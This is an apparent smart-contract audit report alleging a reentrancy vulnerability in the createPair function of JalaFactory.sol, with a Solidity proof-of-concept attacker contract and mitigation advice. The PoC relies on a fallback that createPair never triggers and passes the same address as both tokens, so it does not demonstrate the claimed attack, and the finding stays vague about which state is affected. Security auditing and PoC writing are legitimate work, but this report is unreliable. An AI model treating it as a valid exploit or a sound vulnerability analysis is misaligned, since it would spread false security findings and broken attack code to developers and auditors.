# Reentrancy Vulnerability without ETH Transfer in contracts/JalaFactory.sol

## Summary
A state variable is changed after a contract calls another contract function. The target contract can callback and reenter before the state variable is updated. This may lead to an unexpected result.

## Vulnerability Detail
The root cause of the vulnerability "MWE-035: Reentrancy Vulnerability without ETH Transfer" in the provided code is that the createPair function does not include any specific protection against reentrancy attacks. This means that an attacker could potentially call back into the createPair function before it completes, leading to unexpected behavior and potential security risks.

In a reentrancy attack, an attacker exploits the order of operations in a contract to manipulate the flow of execution and potentially gain unauthorized access to sensitive functions or data. In this case, the lack of protection against reentrancy allows an attacker to potentially call the **createPair** function multiple times in quick succession before it completes, leading to unexpected behavior and potential security risks.

**Proof of Concept (PoC) code:**

1. Deploy a malicious contract that implements a fallback function to call the **createPair** function recursively.

```solidity
pragma solidity ^0.8.0;

interface JalaFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MaliciousContract {
    JalaFactory factory;

    constructor(address _factory) {
        factory = JalaFactory(_factory);
    }

    fallback() external {
        factory.createPair(address(this), address(this)); // Recursive call to createPair
    }

    function startAttack() public {
        factory.createPair(address(this), address(this)); // Initial call to createPair
    }
}
```

2. Deploy the malicious contract and call the **startAttack** function.

```solidity
MaliciousContract maliciousContract = new MaliciousContract(addressOfJalaFactory);
maliciousContract.startAttack();
```
By executing the PoC code, the attacker can exploit the reentrancy vulnerability in the **createPair** function, potentially causing unexpected behavior and manipulating the contract's state.

## Tool used

Manual Review

## Recommendation
To mitigate this vulnerability, it is important to implement proper checks and safeguards to prevent reentrancy attacks. This can include using the **nonReentrant** modifier, updating state variables before interacting with external contracts, and ensuring that critical operations are completed before allowing any external calls to be made.
